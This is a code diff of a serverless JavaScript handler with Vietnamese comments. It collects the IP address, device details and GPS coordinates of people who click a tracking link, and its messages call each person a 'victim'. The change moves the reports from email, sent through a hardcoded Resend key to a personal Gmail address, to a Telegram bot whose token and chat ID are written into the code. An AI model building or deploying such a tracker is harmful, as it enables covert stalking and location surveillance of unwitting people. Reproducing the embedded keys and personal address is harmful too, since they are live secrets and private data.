@@ -1,7 +1,3 @@
-import { Resend } from 'resend';
-
-const resend = new Resend('re_RmZWWdsX_MqgZo2DR1FTvxEhuBR1xfNCt');
-
 export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -10,30 +6,36 @@ export default async function handler(req, res) {
     if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
+    // ==========================================
+    // CẤU HÌNH TELEGRAM
+    const BOT_TOKEN = "8768999948:AAHzR2Avd2VCkiF1soTvB3HOy6QeT8PFvdU"; 
+    const CHAT_ID = "7750249320"; 
+    // ==========================================
+
     try {
         const data = req.body;
         let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
         if (ip.includes(',')) ip = ip.split(',')[0].trim();
 
-        let subject = "🎯 Có người click link!";
-        let htmlContent = "";
+        let message = "";
 
         if (data.type === "basic_info") {
-            subject = "📱 Thông tin thiết bị mới";
-            htmlContent = `<h3>Thông tin thiết bị mới</h3><p><b>IP:</b> ${ip}</p><p><b>Thiết bị (UA):</b> ${data.userAgent}</p><p><b>Màn hình:</b> ${data.screen}</p><p><b>Hệ điều hành:</b> ${data.platform}</p>`;
+            message = `📱 *THIẾT BỊ MỚI*\n\n*IP:* \`${ip}\`\n*Hệ điều hành:* ${data.platform}\n*Màn hình:* ${data.screen}\n*Thiết bị:* ${data.userAgent}`;
         } else if (data.type === "gps") {
-            subject = "📍 ĐÃ LẤY ĐƯỢC GPS!";
-            htmlContent = `<h3>Đã lấy được vị trí GPS!</h3><p><b>IP:</b> ${ip}</p><p><b>Vĩ độ:</b> ${data.lat}</p><p><b>Kinh độ:</b> ${data.lon}</p><p><a href="https://www.google.com/maps?q=${data.lat},${data.lon}">Xem trên Google Maps</a></p>`;
+            message = `📍 *ĐÃ LẤY ĐƯỢC GPS*\n\n*IP:* \`${ip}\`\n*Vĩ độ:* ${data.lat}\n*Kinh độ:* ${data.lon}\n\n[🗺 Xem trên Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})`;
         } else if (data.type === "gps_denied") {
-            subject = "⚠️ Nạn nhân từ chối GPS";
-            htmlContent = `<h3>Nạn nhân từ chối cấp quyền GPS</h3><p><b>IP:</b> ${ip}</p>`;
+            message = `⚠️ *NẠN NHÂN TỪ CHỐI GPS*\n\n*IP:* \`${ip}\`\n*Lỗi:* ${data.error}`;
         }
 
-        await resend.emails.send({
-            from: 'Tracker <onboarding@resend.dev>',
-            to: 'thienlongnhan2k9@gmail.com',
-            subject: subject,
-            html: htmlContent
+        // Bắn tin nhắn qua Telegram API
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
         });
 
         return res.status(200).json({ success: true });
